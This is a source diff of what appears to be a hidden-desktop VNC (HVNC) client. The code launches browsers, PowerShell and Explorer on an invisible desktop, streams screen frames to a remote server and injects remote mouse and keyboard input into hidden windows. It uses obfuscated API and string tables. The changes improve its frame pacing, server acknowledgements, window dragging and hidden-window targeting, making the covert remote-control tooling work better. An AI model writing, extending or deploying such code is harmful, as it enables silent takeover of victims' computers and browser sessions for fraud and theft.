+            ULONGLONG now = GetTickCount64();
+            if (saturatedDiffStreak >= 2)
+            {
+                adaptiveFrameMs = 1000;
+                adaptiveUntil = now + 8000;
+                ++sendStats.fpsThrottles;
+                printf("[SCREEN2][WARN] saturated diff throttling capture interval to %lu ms\n", adaptiveFrameMs);
+            }
+            if (lastSaturatedKeyframeAt && now < lastSaturatedKeyframeAt + 2000)
+            {
+                DWORD waitMs = (DWORD)((lastSaturatedKeyframeAt + 2000) - now);
+                ++sendStats.keyframeRequests;
+                printf("[SCREEN2][WARN] saturated diff keyframe cooldown waited %lu ms\n", waitMs);
+                Funcs::pSleep(waitMs);
+            }
+            lastSaturatedKeyframeAt = GetTickCount64();
+        }
+        else if (!frameInfo.isKeyframe)
+        {
+            saturatedDiffStreak = 0;
+        }
+
+        ULONGLONG sendStartTick = GetTickCount64();
         if (!SendScreenPacket(s, framePacket))
+        {
+            RecordScreen2SendStats(&sendStats, frameInfo, FALSE, 0);
             goto exit;
+        }
+        DWORD sendMs = (DWORD)(GetTickCount64() - sendStartTick);
+        RecordScreen2SendStats(&sendStats, frameInfo, TRUE, sendMs);
 
         int response = 0;
-        if (!RecvInt(s, &response))
+        ULONGLONG ackStartTick = GetTickCount64();
+        ScreenAckStatus ackStatus = RecvScreenFrameAck(s, &response);
+        if (ackStatus == screenAckClosed)
             goto exit;
-        if (response != 0)
+        if (ackStatus == screenAckTimeout)
+        {
+            ++sendStats.ackTimeouts;
+            ++sendStats.keyframeRequests;
             encoder.ForceKeyframe();
+            adaptiveFrameMs = 2000;
+            adaptiveUntil = GetTickCount64() + 9000;
+            ackAdaptiveThrottleActive = TRUE;
+            normalAckWindows = 0;
+            printf("[SCREEN2][WARN] frame ACK timeout, forcing keyframe and throttling capture interval to %lu ms\n", adaptiveFrameMs);
+        }
+        else if (ackStatus == screenAckNeedKeyframe)
+        {
+            ++sendStats.keyframeRequests;
+            encoder.ForceKeyframe();
+            printf("[SCREEN2][WARN] server requested keyframe, forcing full frame\n");
+        }
         else
+        {
+            DWORD ackMs = (DWORD)(GetTickCount64() - ackStartTick);
+            RecordScreen2AckStats(&sendStats, ackMs);
             encoder.CommitLastBuiltFrame();
+        }
+
+        MaybeReportAndApplyScreen2Stats(&sendStats,
+            &lastStatsReportTick,
+            &encoder,
+            &adaptiveFrameMs,
+            &adaptiveUntil,
+            &ackAdaptiveThrottleActive,
+            &ackAdaptiveQualityActive,
+            &normalAckWindows);
 
         if (!firstFrameLogged)
         {
-            printf("[+] First SCREEN2 desktop frame sent: remote=%dx%d, frame=%dx%d, packet=%zu bytes\n",
+            printf("[+] First SCREEN2 desktop frame sent: remote=%dx%d, frame=%dx%d, packet=%zu bytes quality=%d\n",
                 rawFrame.screenWidth,
                 rawFrame.screenHeight,
                 rawFrame.width,
                 rawFrame.height,
-                framePacket.size());
+                framePacket.size(),
+                encoder.GetQuality());
             firstFrameLogged = TRUE;
         }
 
-        Funcs::pSleep(1000 / screen2::DEFAULT_FPS);
+        DWORD frameMs = GetEffectiveScreen2FrameMs(baseFrameMs, adaptiveFrameMs, adaptiveUntil);
+        DWORD elapsedMs = (DWORD)(GetTickCount64() - frameStartTick);
+        if (frameMs > elapsedMs)
+            Funcs::pSleep(frameMs - elapsedMs);
     }
 
 exit:
@@ -767,7 +1633,8 @@ static void StartChrome()
     startupInfo.cb = sizeof(startupInfo);
     startupInfo.lpDesktop = g_desktopName;
     PROCESS_INFORMATION processInfo = { 0 };
-    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
+    if (Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo))
+        CloseProcessInformationHandles(&processInfo);
 }
 
 static void StartEdge()
@@ -781,7 +1648,8 @@ static void StartEdge()
     startupInfo.cb = sizeof(startupInfo);
     startupInfo.lpDesktop = g_desktopName;
     PROCESS_INFORMATION processInfo = { 0 };
-    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
+    if (Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo))
+        CloseProcessInformationHandles(&processInfo);
 }
 
 static void StartBrave()
@@ -796,7 +1664,8 @@ static void StartBrave()
     startupInfo.cb = sizeof(startupInfo);
     startupInfo.lpDesktop = g_desktopName;
     PROCESS_INFORMATION processInfo = { 0 };
-    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
+    if (Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo))
+        CloseProcessInformationHandles(&processInfo);
 }
 
 static void StartFirefox()
@@ -873,7 +1742,8 @@ static void StartFirefox()
 
     startupInfo.cb = sizeof(startupInfo);
     startupInfo.lpDesktop = g_desktopName;
-    Funcs::pCreateProcessA(NULL, browserPath, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
+    if (Funcs::pCreateProcessA(NULL, browserPath, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo))
+        CloseProcessInformationHandles(&processInfo);
 
 exit:
     Funcs::pCloseHandle(hProfilesIni);
@@ -891,7 +1761,8 @@ static void StartPowershell()
     startupInfo.cb = sizeof(startupInfo);
     startupInfo.lpDesktop = g_desktopName;
     PROCESS_INFORMATION processInfo = { 0 };
-    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
+    if (Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo))
+        CloseProcessInformationHandles(&processInfo);
 }
 
 static void StartIe()
@@ -904,7 +1775,8 @@ static void StartIe()
     startupInfo.cb = sizeof(startupInfo);
     startupInfo.lpDesktop = g_desktopName;
     PROCESS_INFORMATION processInfo = { 0 };
-    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
+    if (Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo))
+        CloseProcessInformationHandles(&processInfo);
 }
 
 static DWORD WINAPI InputThread(LPVOID param)
@@ -921,6 +1793,7 @@ static DWORD WINAPI InputThread(LPVOID param)
         printf("[diag] Input thread attached to desktop: %s\n", g_desktopName);
     else
         printf("[!] Input thread SetThreadDesktop failed\n");
+    LogDesktopState("input-thread-start");
 
     if (!SendAll(s, gc_magik, (int)sizeof(gc_magik)))
     {
@@ -943,6 +1816,11 @@ static DWORD WINAPI InputThread(LPVOID param)
     }
 
     printf("[+] Input channel ready; session id=%d\n", sessionId);
+    if (!g_dumpedInputDesktopState)
+    {
+        g_dumpedInputDesktopState = TRUE;
+        DumpHiddenDesktopWindows("input-ready");
+    }
 
     g_hDesktopThread = Funcs::pCreateThread(NULL, 0, DesktopThread, (LPVOID)(ULONG_PTR)(DWORD)sessionId, 0, 0);
     if (g_hDesktopThread)
@@ -951,12 +1829,13 @@ static DWORD WINAPI InputThread(LPVOID param)
         printf("[!] Desktop thread creation failed\n");
 
     POINT      lastPoint;
-    BOOL       lmouseDown = FALSE;
     HWND       hResMoveWindow = NULL;
-    LRESULT    resMoveType = NULL;
+    LRESULT    resMoveType = 0;
+    BOOL       lmouseDown = FALSE;
 
     lastPoint.x = 0;
     lastPoint.y = 0;
+    BOOL keyDown[256] = { 0 };
 
     for (;;)
     {
@@ -980,15 +1859,21 @@ static DWORD WINAPI InputThread(LPVOID param)
             const DWORD neverCombine = 2;
             const char *valueName = Strs::hd4;
 
-            HKEY hKey;
-            Funcs::pRegOpenKeyExA(HKEY_CURRENT_USER, Strs::hd3, 0, KEY_ALL_ACCESS, &hKey);
-            DWORD value;
+            HKEY hKey = NULL;
+            DWORD value = 0;
             DWORD size = sizeof(DWORD);
             DWORD type = REG_DWORD;
-            Funcs::pRegQueryValueExA(hKey, valueName, 0, &type, (BYTE *)&value, &size);
+            BOOL restoreTaskbarSetting = FALSE;
 
-            if (value != neverCombine)
-                Funcs::pRegSetValueExA(hKey, valueName, 0, REG_DWORD, (BYTE *)&neverCombine, size);
+            if (Funcs::pRegOpenKeyExA(HKEY_CURRENT_USER, Strs::hd3, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
+            {
+                if (Funcs::pRegQueryValueExA(hKey, valueName, 0, &type, (BYTE *)&value, &size) == ERROR_SUCCESS)
+                {
+                    restoreTaskbarSetting = TRUE;
+                    if (value != neverCombine)
+                        Funcs::pRegSetValueExA(hKey, valueName, 0, REG_DWORD, (BYTE *)&neverCombine, size);
+                }
+            }
 
             char explorerPath[MAX_PATH] = { 0 };
             Funcs::pGetWindowsDirectoryA(explorerPath, MAX_PATH);
@@ -999,9 +1884,21 @@ static DWORD WINAPI InputThread(LPVOID param)
             startupInfo.cb = sizeof(startupInfo);
             startupInfo.lpDesktop = g_desktopName;
             PROCESS_INFORMATION processInfo = { 0 };
-            Funcs::pCreateProcessA(explorerPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
+            SetLastError(0);
+            BOOL createdExplorer = Funcs::pCreateProcessA(explorerPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
+            printf("[diag] startExplorer CreateProcess path='%s' desktop='%s' result=%s pid=%lu tid=%lu lastError=%lu\n",
+                explorerPath,
+                g_desktopName,
+                createdExplorer ? "ok" : "failed",
+                createdExplorer ? processInfo.dwProcessId : 0,
+                createdExplorer ? processInfo.dwThreadId : 0,
+                GetLastError());
+            if (createdExplorer)
+            {
+                CloseProcessInformationHandles(&processInfo);
+            }
 
-            APPBARDATA appbarData;
+            APPBARDATA appbarData = { 0 };
             appbarData.cbSize = sizeof(appbarData);
             for (int i = 0; i < 5; ++i)
             {
@@ -1014,8 +1911,14 @@ static DWORD WINAPI InputThread(LPVOID param)
             appbarData.lParam = ABS_ALWAYSONTOP;
             Funcs::pSHAppBarMessage(ABM_SETSTATE, &appbarData);
 
-            Funcs::pRegSetValueExA(hKey, valueName, 0, REG_DWORD, (BYTE *)&value, size);
-            Funcs::pRegCloseKey(hKey);
+            if (hKey)
+            {
+                if (restoreTaskbarSetting)
+                    Funcs::pRegSetValueExA(hKey, valueName, 0, REG_DWORD, (BYTE *)&value, size);
+                Funcs::pRegCloseKey(hKey);
+            }
+
+            DumpHiddenDesktopWindows("after-startExplorer");
             break;
         }
         case WmStartApp::startRun:
@@ -1028,7 +1931,8 @@ static DWORD WINAPI InputThread(LPVOID param)
             startupInfo.cb = sizeof(startupInfo);
             startupInfo.lpDesktop = g_desktopName;
             PROCESS_INFORMATION processInfo = { 0 };
-            Funcs::pCreateProcessA(NULL, rundllPath, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
+            if (Funcs::pCreateProcessA(NULL, rundllPath, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo))
+                CloseProcessInformationHandles(&processInfo);
             break;
         }
         case WmStartApp::startPowershell:
@@ -1075,7 +1979,7 @@ static DWORD WINAPI InputThread(LPVOID param)
             if (!hWnd)
                 hWnd = g_lastInputHwnd;
             if (!hWnd)
-                hWnd = Funcs::pWindowFromPoint(point);
+                hWnd = FindHiddenDesktopWindowFromPoint(point);
             break;
         }
         default:
@@ -1086,7 +1990,7 @@ static DWORD WINAPI InputThread(LPVOID param)
             lastPointCopy = lastPoint;
             lastPoint = point;
 
-            hWnd = Funcs::pWindowFromPoint(point);
+            hWnd = FindHiddenDesktopWindowFromPoint(point);
             if (!hWnd)
             {
                 POINT emptyPoint = { 0, 0 };
@@ -1094,10 +1998,14 @@ static DWORD WINAPI InputThread(LPVOID param)
                     LogInputTarget("drop-no-window", msg, NULL, point, emptyPoint, FALSE);
                 continue;
             }
+            if (ShouldLogInput(msg))
+                LogWindowDetails("hidden-hit-test", hWnd);
 
             if (msg == WM_LBUTTONUP)
             {
                 lmouseDown = FALSE;
+                hResMoveWindow = NULL;
+                resMoveType = 0;
                 LRESULT lResult = Funcs::pSendMessageA(hWnd, WM_NCHITTEST, NULL, lParam);
 
                 HWND topHwnd = hWnd;
@@ -1136,30 +2044,16 @@ static DWORD WINAPI InputThread(LPVOID param)
             else if (msg == WM_LBUTTONDOWN)
             {
                 lmouseDown = TRUE;
-                hResMoveWindow = NULL;
                 g_lastInputHwnd = hWnd;
+                hResMoveWindow = GetMovableTopWindow(hWnd);
+                resMoveType = Funcs::pSendMessageA(hResMoveWindow, WM_NCHITTEST, NULL, lParam);
 
-                HWND topFocusHwnd = GetTopLevelWindow(hWnd);
-                BOOL bringResult = topFocusHwnd ? BringWindowToTop(topFocusHwnd) : FALSE;
-                BOOL foregroundResult = topFocusHwnd ? SetForegroundWindow(topFocusHwnd) : FALSE;
-                HWND activeResult = topFocusHwnd ? SetActiveWindow(topFocusHwnd) : NULL;
-                HWND focusResult = SetFocus(hWnd);
                 if (ShouldLogInput(msg))
-                {
-                    char className[128];
-                    char title[128];
-                    DescribeWindow(hWnd, className, sizeof(className), title, sizeof(title));
-                    printf("[input] focus WM_LBUTTONDOWN target=0x%p top=0x%p class='%s' title='%s' bring=%d foreground=%d active=0x%p focus=0x%p lastError=%lu\n",
+                    printf("[input] nchittest WM_LBUTTONDOWN target=0x%p moveWindow=0x%p hit=%lld movable=%d\n",
                         hWnd,
-                        topFocusHwnd,
-                        className,
-                        title,
-                        bringResult,
-                        foregroundResult,
-                        activeResult,
-                        focusResult,
-                        GetLastError());
-                }
+                        hResMoveWindow,
+                        (long long)resMoveType,
+                        IsMoveResizeHit(resMoveType));
 
                 RECT startButtonRect;
                 HWND hStartButton = Funcs::pFindWindowA("Button", NULL);
@@ -1186,29 +2080,14 @@ static DWORD WINAPI InputThread(LPVOID param)
                     }
                 }
             }
-            else if (msg == WM_MOUSEMOVE)
+            else if (msg == WM_MOUSEMOVE && lmouseDown && hResMoveWindow && IsMoveResizeHit(resMoveType))
             {
-                if (!lmouseDown)
-                    continue;
-
-                if (!hResMoveWindow)
-                {
-                    resMoveType = Funcs::pSendMessageA(hWnd, WM_NCHITTEST, NULL, lParam);
-                    while ((Funcs::pGetWindowLongA(hWnd, GWL_STYLE) & WS_CHILD))
-                    {
-                        HWND p = Funcs::pGetParent(hWnd);
-                        if (!p) break;
-                        hWnd = p;
-                    }
-                }
-                else
-                    hWnd = hResMoveWindow;
-
                 int moveX = lastPointCopy.x - point.x;
                 int moveY = lastPointCopy.y - point.y;
 
                 RECT rect;
-                Funcs::pGetWindowRect(hWnd, &rect);
+                if (!Funcs::pGetWindowRect(hResMoveWindow, &rect))
+                    break;
 
                 int x = rect.left;
                 int y = rect.top;
@@ -1217,66 +2096,62 @@ static DWORD WINAPI InputThread(LPVOID param)
                 switch (resMoveType)
                 {
                 case HTCAPTION:
-                {
                     x -= moveX;
                     y -= moveY;
                     break;
-                }
                 case HTTOP:
-                {
                     y -= moveY;
                     height += moveY;
                     break;
-                }
                 case HTBOTTOM:
-                {
                     height -= moveY;
                     break;
-                }
                 case HTLEFT:
-                {
                     x -= moveX;
                     width += moveX;
                     break;
-                }
                 case HTRIGHT:
-                {
                     width -= moveX;
                     break;
-                }
                 case HTTOPLEFT:
-                {
                     y -= moveY;
                     height += moveY;
                     x -= moveX;
                     width += moveX;
                     break;
-                }
                 case HTTOPRIGHT:
-                {
                     y -= moveY;
                     height += moveY;
                     width -= moveX;
                     break;
-                }
                 case HTBOTTOMLEFT:
-                {
                     height -= moveY;
                     x -= moveX;
                     width += moveX;
                     break;
-                }
                 case HTBOTTOMRIGHT:
-                {
                     height -= moveY;
                     width -= moveX;
                     break;
                 }
-                default:
-                    continue;
-                }
-                Funcs::pMoveWindow(hWnd, x, y, width, height, FALSE);
-                hResMoveWindow = hWnd;
+
+                if (width < 50)
+                    width = 50;
+                if (height < 50)
+                    height = 50;
+
+                SetLastError(0);
+                BOOL movedWindow = Funcs::pMoveWindow(hResMoveWindow, x, y, width, height, TRUE);
+                if (ShouldLogInput(msg))
+                    printf("[input] move-window hwnd=0x%p hit=%lld pos=(%d,%d,%d,%d) result=%s lastError=%lu\n",
+                        hResMoveWindow,
+                        (long long)resMoveType,
+                        x,
+                        y,
+                        width,
+                        height,
+                        movedWindow ? "ok" : "failed",
+                        GetLastError());
                 continue;
             }
             break;
@@ -1299,8 +2174,12 @@ static DWORD WINAPI InputThread(LPVOID param)
             {
                 hWnd = currHwnd;
                 Funcs::pScreenToClient(currHwnd, &point);
-                currHwnd = Funcs::pChildWindowFromPoint(currHwnd, point);
+                currHwnd = ChildWindowFromPointEx(currHwnd, point, CWP_SKIPINVISIBLE | CWP_SKIPDISABLED | CWP_SKIPTRANSPARENT);
                 if (!currHwnd || currHwnd == hWnd)
+                    break;
+                char childClass[128] = { 0 };
+                GetClassNameA(currHwnd, childClass, sizeof(childClass));
+                if (IsExcludedInputClass(childClass))
                     break;
             }
 
@@ -1324,19 +2203,12 @@ static DWORD WINAPI InputThread(LPVOID param)
 
             if (msg == WM_LBUTTONDOWN)
             {
-                HWND finalFocusResult = SetFocus(hWnd);
-                if (ShouldLogInput(msg))
-                {
-                    char className[128];
-                    char title[128];
-                    DescribeWindow(hWnd, className, sizeof(className), title, sizeof(title));
-                    printf("[input] final-focus WM_LBUTTONDOWN hwnd=0x%p class='%s' title='%s' focus=0x%p lastError=%lu\n",
-                        hWnd,
-                        className,
-                        title,
-                        finalFocusResult,
-                        GetLastError());
-                }
+                LogWindowDetails("final-mouse-target", hWnd);
+                char className[128] = { 0 };
+                char title[128] = { 0 };
+                DescribeWindow(hWnd, className, sizeof(className), title, sizeof(title));
+                if (!lstrcmpiA(className, "UserOOBEWindowClass"))
+                    DumpHiddenDesktopWindows("target-UserOOBEWindowClass");
             }
         }
         else
@@ -1344,10 +2216,11 @@ static DWORD WINAPI InputThread(LPVOID param)
             clientPt = screenPoint;
         }
 
+        UpdateKeyStateCache(msg, wParam, keyDown);
         SetLastError(0);
         BOOL posted = Funcs::pPostMessageA(hWnd, msg, wParam, lParam);
         if (ShouldLogInput(msg))
-            LogInputTarget("post", msg, hWnd, screenPoint, clientPt, posted);
+            LogInputTarget("post-hidden", msg, hWnd, screenPoint, clientPt, posted);
     }
 exit:
     printf("[!] Input thread exiting\n");
